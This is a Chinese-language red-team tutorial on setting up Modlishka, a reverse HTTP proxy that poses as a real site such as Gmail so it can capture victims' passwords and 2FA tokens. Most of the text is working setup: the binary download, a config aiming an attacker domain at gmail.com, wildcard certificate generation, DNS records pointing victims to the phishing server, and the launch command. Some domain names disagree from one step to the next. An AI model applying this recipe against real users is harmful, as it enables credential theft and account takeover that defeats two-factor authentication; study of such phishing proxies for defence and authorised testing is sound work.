# modlishka钓鱼

# Modlishka

本实验展示了如何设置`Modlishka`可用于网络钓鱼活动的反向 HTTP 代理，以窃取用户密码和 2FA 令牌。Modlishka 使这成为可能，因为它位于您作为攻击者冒充的网站和受害者 (MITM) 之间，同时记录了所有通过它的流量/令牌/密码。

# 1、安装

## 1、安装certbot 

```
brew install certbot  #mac
apt-get install certbot #linux
```

## 2、安装Modlishka

```
wget https://github.com/drk1wi/Modlishka/releases/download/v.1.1.0/Modlishka-linux-amd64
chmod +x Modlishka-linux-amd64
ls -lah 
```

![img](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT9ga7bDsW9ghRRgY%2FAnnotation 2019-06-25 214300.png?alt=media&token=42a4c407-1ba5-45ef-90e1-b65f97379636)

![image-20220731104013359](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pwt62y73j20ua07cmyg.jpg)

# 2、Modlishka 配置

让我们为 modlishka 创建一个配置文件：

![img](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTFMH3mWerGfyOEOV%2FAnnotation 2019-06-25 214425.png?alt=media&token=88207ce2-73be-4995-bf83-ccdebc499b0b)

```
{
  //domain that you will be tricking your victim of visiting
  "proxyDomain": "redteam.me",
  "listeningAddress": "0.0.0.0",

  //domain that you want your victim to think they are visiting
  "target": "gmail.com",
  "targetResources": "",
  "targetRules":         "PC9oZWFkPg==:",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": false,
  "log": "requests.log",
  "plugins": "all",
  "cert": "",
  "certKey": "",
  "certPool": ""
}
```

# 3、配置证书

重要 - 让我们为我希望我的网络钓鱼受害者登陆的域生成一个证书`*.tobyblog.cn`：

## 1、使用certbot生成证书

```
sudo certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d "*.tobyblog.cn" --email noreply@live.com
```

![image-20220731104407974](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pwx6qcpfj210s0p4q6v.jpg)

然后我们需要在我们的域名的DNS控制台配置,配置完需要等待10分钟左右才能生效.

可以在上面第二个红框地址查看配置是否生效

![image-20220731104711648](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4px0daywhj20uh0u0q4j.jpg)

![image-20220731105901604](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pxcp471rj21iy0u0dhw.jpg)

创建 DNS TXT 记录后，按回车继续生成证书：

![image-20220731105958440](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pxdntz1sj21dc0im0wb.jpg)

生成证书后，我们需要将它们转换为适合嵌入 JSON 对象的格式：

```
awk '{printf "%s\\n", $0}' /etc/letsencrypt/live/redteam.me/fullchain.pem 
awk '{printf "%s\\n", $0}' /etc/letsencrypt/live/redteam.me/privkey.pem 
```

![image-20220731110032804](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pxea1g8nj21oa0l2tmc.jpg)

在配置文件中添加证书和key

![image-20220731111110653](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pxpbxv9xj21ka0u0q82.jpg)

# 4、配置访问DNS 记录

让我们为根主机创建一条 A 记录`t`，它只指向 钓鱼服务器 的 IP：

![image-20220731111222346](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24egy1h4pxqrl5n8j216m03yglp.jpg)

这非常重要——我们需要`CNAME`记录任何`*`指向的主机/子域`t`

![img](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTu8I9q-pAD0c5HDZ%2FAnnotation 2019-06-25 215702.png?alt=media&token=b739db5f-3dce-4ce1-836c-faf61f35100e)

# 5、启动 Modlishka

我们现在准备通过启动 modlishka 并为其提供 modlishka.json 配置文件来开始测试：

### 1

```
sudo ./Modlishka-linux-amd64 -config modlishka.json
```



下面显示了通过访问 t.tobylobg.cn，我如何获得 www.su-sanha.cn 的内容 Modlishka 和 MITM 有效。再次强调一下很重要 - 我们没有创建目标网站的任何副本或模板 - 受害者实际上正在浏览 gmail，只是它是通过 Modlishka 提供服务的，在此检查流量并捕获密码：

![img](https://tva1.sinaimg.cn/large/e6c9d24egy1h4pwlj0b3vg21ih0u00y2.gif)

# 参考